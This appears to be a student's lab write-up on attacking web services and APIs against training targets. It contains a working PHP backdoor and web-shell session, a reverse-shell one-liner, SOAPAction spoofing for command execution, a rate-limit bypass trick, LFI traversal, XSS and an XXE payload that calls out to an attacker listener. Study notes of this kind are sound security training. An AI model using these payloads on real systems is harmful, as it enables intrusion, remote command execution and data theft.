# Web Service vs. API

All web services are APIs, but not all APIs are web services.

**Differences:**

- Web services require a network; APIs can work offline.
- Web services often use SOAP; APIs can use XML-RPC, JSON-RPC, SOAP, REST, etc.
- Web services typically use XML; APIs often use JSON.
- Web services are less open to external developers; APIs can be more open.

## Types of Web Services / Technologies

1. XML-RPC

- Uses XML to encode/decode remote procedure calls.
- Usually transported via HTTP.

<img width="1032" height="682" alt="image" src="https://github.com/user-attachments/assets/031ee85e-3f74-49cf-b1d0-26fa1909cb32" />


2. JSON-RPC

- Uses JSON to call methods.
- Usually transported via HTTP.

<img width="1006" height="442" alt="image" src="https://github.com/user-attachments/assets/db09fcba-baa8-446d-80fd-98924accfac4" />

3. SOAP (Simple Object Access Protocol)

- Uses XML but is more complex than XML-RPC.
- Has a header (actions/rules) and body (data).
- May include WSDL to describe usage.
- Transport can be HTTP or others.

<img width="1058" height="630" alt="image" src="https://github.com/user-attachments/assets/7095fee2-fbf2-4e6b-8834-f5af6fd676a0" />

4. WS-BPEL

- Based on SOAP.
- Adds functionality for describing/invoking business processes.

5. REST (Representational State Transfer)

- Uses HTTP verbs (GET, POST, PUT, DELETE) for actions.
- Usually uses JSON or XML.
- WSDL is rare.
- HTTP is the main transport.

<img width="905" height="752" alt="image" src="https://github.com/user-attachments/assets/17afc304-16d7-4266-8cbf-ffef96c4dd88" />


# Web Services Description Language (WSDL)

WSDL is an XML-based file that describes a web service:

- What services/methods it provides
- Where they are located
- How to call them (method-calling convention)

Some developers hide WSDL files or put them in uncommon locations. We can use directory and parameter fuzzing to find them.

## 1. Directory Fuzzing

We start by scanning for possible WSDL files.

`dirb http://<TARGET IP>:3002`

Result:

`+ http://<TARGET IP>:3002/wsdl (CODE:200|SIZE:0)`

## 2. Inspecting /wsdl

`aykhan21@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl`


Result: Empty response → likely needs a parameter.


## 3. Parameter Fuzzing

We try parameters using ffuf with `-fs 0` to filter empty responses and `-mc 200` for `HTTP 200 only`.

`aykhan21@htb[/htb]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200`

Result:

`wsdl [Status: 200, Size: 4461]`

## 4. Accessing the WSDL File

`aykhan21@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl`

Result: Full WSDL XML with service details, including:

- Operations: Login, ExecuteCommand
- Parameters: username, password, cmd
- Service endpoint: http://localhost:80/wsdl

## 5. WSDL Structure (Key Elements)

Definition – Root element containing namespaces, types, messages, operations, and service details.

`<wsdl:definitions targetNamespace="http://tempuri.org/">`

**Data Types** – Defines request/response formats.

<img width="562" height="208" alt="image" src="https://github.com/user-attachments/assets/eacca402-0d10-4fbd-9e24-920828b95e60" />

**Messages** – Input/output formats for each operation.

<img width="642" height="105" alt="image" src="https://github.com/user-attachments/assets/ae8f0cf8-39a9-4a2d-ac4d-12f7f14e0f8f" />

**Port Type** – Lists operations.

<img width="510" height="152" alt="image" src="https://github.com/user-attachments/assets/d863e946-a869-4a2d-a3af-bcc24b01fe74" />

**Binding** – How operations are called (SOAP config).

<img width="585" height="52" alt="image" src="https://github.com/user-attachments/assets/ff38353e-aac7-4599-9007-20a497f4af91" />

**Service** – The actual endpoint.

<img width="578" height="50" alt="image" src="https://github.com/user-attachments/assets/52f55c9f-807a-4bd8-b420-7492a00a0e64" />

# SOAPAction Spoofing

Some SOAP services use the SOAPAction HTTP header to decide which operation to execute — without actually parsing the XML body.
If the server only checks the SOAPAction header, it may be possible to spoof a restricted operation.


## Vulnerable Service

<img width="812" height="572" alt="image" src="https://github.com/user-attachments/assets/e7f6f780-aee8-411c-a6ff-e334957c7d0c" />


**1. Normal Request (Blocked)**

<img width="746" height="550" alt="image" src="https://github.com/user-attachments/assets/6f604383-1d06-440d-80b7-dfc4a6b798b1" />

Result: "This function is only allowed in internal networks"

**2.Spoofed Request (Bypass)**

We put a harmless operation (LoginRequest) in the body, but keep the SOAPAction as ExecuteCommand.

<img width="757" height="338" alt="image" src="https://github.com/user-attachments/assets/87d42f0f-9944-40ed-8198-3b4d581f97c1" />

**3.Interactive Exploit Script**

<img width="737" height="656" alt="image" src="https://github.com/user-attachments/assets/d3f0611e-4853-400c-964a-edbffe4e92bb" />

Result: Command executed successfully — restriction bypassed.


# Info Disclosure

**Information Disclosure (with a twist of SQLi)**

APIs or web services may leak information due to misconfigurations or insufficient input validation. Fuzzing parameters is a good starting point.

## Parameter Fuzzing

**Use ffuf with a parameter wordlist to find interesting parameters:**

`ffuf -w burp-parameter-names.txt -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19`

`-fs 19` filters out responses with default size (non-interesting responses).

Example result: parameter id is valid.

**Check a valid parameter:**

`curl http://<TARGET IP>:3003/?id=1`

Response:

`[{"id":"1","username":"admin","position":"1"}]`


## Automating Data Retrieval

Python script to iterate over IDs:

<img width="451" height="280" alt="image" src="https://github.com/user-attachments/assets/f38f9554-2b26-42e2-ade7-52cdd7bbab8d" />

Run it:

`python3 brute_api.py http://<TARGET IP>:3003`

Output:

<pre>Number found! 1
[{"id":"1","username":"admin","position":"1"}]
Number found! 2
[{"id":"2","username":"HTB-User-John","position":"2"}]
...</pre>

## Tips

APIs may have rate limits; bypass with headers like X-Forwarded-For:

<img width="557" height="167" alt="image" src="https://github.com/user-attachments/assets/d1c5eae1-8e54-4340-bf74-9cc23a66b4cc" />

SQL Injection can also target parameters like id. Test classic payloads.


# Arbitrary File Upload

Arbitrary file upload vulnerabilities allow attackers to upload malicious files, execute commands, and potentially gain full control of the server.

## PHP File Upload via API

Target application: `http://<TARGET IP>:3001`
Look for file upload functionality (1MB limit, no auth required).

Create a simple PHP backdoor (backdoor.php):

`<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); die; } ?>`


Upload via the API (`/api/upload/`). The server may allow:

- `.php` extensions
- `application/x-php` content type
- No content scanning

Uploaded file location example:

`http://<TARGET IP>:3001/uploads/backdoor.php`

Interactive Web Shell Script

Python script (web_shell.py) to interact with the uploaded backdoor:

<img width="1080" height="557" alt="image" src="https://github.com/user-attachments/assets/c780b5b8-20c8-4865-a9b3-0b4a7a6eaced" />

## Usage

Interactive shell:

`python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes`

Example session:

<pre>$ id
uid=0(root) gid=0(root) groups=0(root)</pre>

## Reverse Shell

Inside the interactive shell, spawn a reverse shell (ensure a listener is running):

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);...'`



# Local File Inclusion (LFI)

LFI vulnerabilities allow attackers to read internal files and sometimes execute code (e.g., via Apache log poisoning).

## Target API

Target: `http://<TARGET IP>:3000/api`

Check if the API is alive:

`curl http://<TARGET IP>:3000/api`

`{"status":"UP"}`

## API Endpoint Fuzzing

Use ffuf to discover endpoints:

`ffuf -w "/path/to/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'`


## Example output shows a valid endpoint:

`download [Status: 200, Size: 71, Words: 5, Lines: 1]`

**Interacting with the Endpoint:**

`curl http://<TARGET IP>:3000/api/download`

`{"success":false,"error":"Input the filename via /download/<filename>"}`

We need to provide a filename.


## Exploiting LFI

Attempt directory traversal to read system files:

`curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"`

**Example output:**

<pre>127.0.0.1 localhost
127.0.1.1 nix01-websvc
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters</pre>


✅ The API is vulnerable to Local File Inclusion.


# Cross-Site Scripting (XSS)

XSS vulnerabilities allow attackers to execute arbitrary JavaScript in a victim’s browser, which can lead to complete web application compromise if combined with other flaws.

**Target API**

Target: http://<TARGET IP>:3000/api/download

**Check reflection behavior:**

<pre>http://<TARGET IP>:3000/api/download/test_value
 Message: 'test_value not found!'</pre>

test_value is reflected in the response → potential XSS.

## Testing a Script Payload

Submit a basic script payload:

`<script>alert(document.domain)</script>`

Response:

`Cannot GET /api/download/<script>alert(document.domain)</script>`

The application encodes input → script not executed.

## URL-Encoded Payload

Encode payload once and try again:

`%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E`

Result: An alert box appears showing the IP address `10.129.144.21. ✅`

The API endpoint is vulnerable to XSS.




# XML External Entity (XXE) Injection

XXE vulnerabilities happen when user-supplied XML is not properly sanitized, allowing attackers to read internal files or perform other malicious actions. XXE can impact both web apps and APIs.

**Target API**

Target: `http://<TARGET IP>:3001`

We encounter an authentication page sending XML data.

**Example POST request to `/api/login`:**

<img width="373" height="212" alt="image" src="https://github.com/user-attachments/assets/9cc71a0a-6d2b-4fc0-9adc-7610446b0147" />

## Crafting an XXE Payload

Add a DOCTYPE to define an external entity:

<img width="680" height="213" alt="image" src="https://github.com/user-attachments/assets/da02d3d8-438a-438b-9011-bdf5f568a53d" />

`DOCTYPE` defines the XML structure.

`ENTITY` defines a variable (somename) pointing to an external resource (SYSTEM).

`&somename;` references the entity in the XML.

## Setting Up Listener

`nc -nlvp 4444`

## Sending the Exploit

`curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'`

Result: The target connects to your listener, confirming XXE vulnerability.
